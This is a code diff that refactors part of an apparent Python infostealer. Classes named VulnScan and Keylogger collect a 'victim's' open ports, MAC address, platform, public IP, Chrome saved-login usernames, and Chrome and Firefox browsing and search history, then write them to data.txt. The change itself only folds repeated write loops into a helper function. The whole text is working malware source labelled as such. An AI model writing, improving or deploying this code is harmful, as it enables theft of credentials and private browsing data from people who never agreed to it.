@@ -119,9 +119,10 @@ class Chrome(Firefox):
 class VulnScan(Chrome):
 	def __init__(self):
 		super().__init__()
+		self.FILE_NAME = "data.txt"
 
 	def write_to_file(self, item, item2=None, item3=None):
-		with open("data.txt", "a") as f:
+		with open(self.FILE_NAME, "a") as f:
 			if item2 and not item3:
 				f.write(f"{item}\t{item2}\n")
 			elif item2 and item3:
@@ -133,7 +134,7 @@ class VulnScan(Chrome):
 
 	def file_title(self, string, new_line, left=False, right=False):
 		new_line_count = "\n" * new_line
-		with open("data.txt", "a") as f:
+		with open(self.FILE_NAME, "a") as f:
 			if left and right:
 				f.write(f"{new_line_count}{string}{new_line_count}")
 			elif left:
@@ -181,26 +182,42 @@ class VulnScan(Chrome):
 			break
 		return listening_ports
 
+	def for_loop_func(self, info, dict_item=None, unique=False, list_item=None, extra_item=None, no_key_value=None):
+		self.file_title(info, new_line=2, right=True)
+		star = "*" * 75
+
+		if list_item and unique:
+			list_item = set(list_item)
+
+		if dict_item and not list_item:
+			if isinstance(dict_item, dict):
+				for key, value in dict_item.items():
+					if no_key_value and ":" not in str(key):
+						key = no_key_value
+					if extra_item:
+						username = value[0]
+						self.write_to_file(extra_item, username, key)
+					else:
+						self.write_to_file(key, value)
+			else:
+				raise TypeError("Not a dictionary")
+
+		elif list_item and not dict_item:
+			if isinstance(list_item, list) or isinstance(list_item, set):
+				for term in list_item:
+					if not isinstance(term, str):
+						term = term[0]
+					self.write_to_file(term)
+			else:
+				raise TypeError("Invalid type. Must be a set or List")
+
+		self.file_title(star, new_line=2, left=True, right=True)
+		return
+
 	def vuln_scanner(self):
 		check_firefox = self.gather_browsers("Program Files")
 		ports = self.windows_open_ports()
 		star = "*" * 75
-
-		if check_firefox:
-			self.file_title("[+] Firefox places details", new_line=2, right=True)
-			places = self.firefox_places()
-
-			for key, value in places.items():
-				if not key:
-					key = "[-] No time"
-				self.write_to_file(key, value)
-			self.file_title(star, new_line=2, left=True, right=True)
-		self.file_title("[+] Victim Windows Open Ports", new_line=2, right=True)
-
-		for port in ports:
-			self.write_to_file(port)
-		self.file_title(star, new_line=2, left=True, right=True)
-		self.file_title("[+] Victim Information", new_line=2, right=True)
 
 		mac_address = self.mac_address()
 		platform = self.get_platform()
@@ -214,31 +231,18 @@ class VulnScan(Chrome):
 			"IP address": public_ip
 		}
 
-		for key, value in victim_info.items():
-			self.write_to_file(key, value)
-		self.file_title(star, new_line=2, left=True, right=True)
-		self.file_title("[+] Chrome login Data", new_line=2, right=True)
-
 		chrome_login_data = self.chrome_login_data()
-
-		for key, value in chrome_login_data.items():
-			username = value[0]
-			self.write_to_file("[+] Username", username, key)
-		self.file_title(star, new_line=2, left=True, right=True)
-		self.file_title("[+] Chrome History Data", new_line=2, right=True)
-
 		chrome_history_data, chrome_history_keyword_data = self.chrome_history_data()
+
+		if check_firefox:
+			places = self.firefox_places()
+			self.for_loop_func("[+] Firefox places details", dict_item=places, no_key_value="[-] No time")
 		
-		for key, value in chrome_history_data.items():
-			self.write_to_file(key, value)
-
-		self.file_title(star, new_line=2, left=True, right=True)
-		self.file_title("[+] Chrome Search History", new_line=2, right=True)
-
-		for search in set(chrome_history_keyword_data):
-			self.write_to_file(search[0])
-
-		self.file_title(star, new_line=2, left=True, right=True)
+		self.for_loop_func("[+] Victim Windows Open Ports", list_item=ports)
+		self.for_loop_func("[+] Victim Information", dict_item=victim_info)
+		self.for_loop_func("[+] Chrome login Data", extra_item="[+] Username", dict_item=chrome_login_data)
+		self.for_loop_func("[+] Chrome History Data", dict_item=chrome_history_data)
+		self.for_loop_func("[+] Chrome Search History", list_item=chrome_history_keyword_data, unique=True)
 
 class Keylogger(VulnScan):
 	def __init__(self):
